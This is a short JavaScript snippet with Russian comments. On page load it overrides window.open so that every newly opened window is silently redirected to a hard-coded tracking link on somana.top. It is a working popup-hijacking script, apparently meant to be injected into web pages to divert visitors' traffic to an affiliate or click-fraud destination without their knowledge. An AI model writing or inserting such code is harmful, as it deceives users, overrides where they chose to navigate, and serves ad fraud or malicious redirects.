window.onload = function () {
  const originalOpen = window.open;

  window.open = function (url, name, specs) {
    console.log(`Перехват вызова window.open с URL: ${url}`);

    const newWindow = originalOpen.call(this, url, name, specs);

    if (newWindow) {
      console.log('Новое окно открыто, выполняем редирект');
      newWindow.location.href = 'https://somana.top/click?o=2&a=7685'; // Редирект
    } else {
      console.log('Не удалось открыть новое окно');
    }

    return newWindow;
  };
};
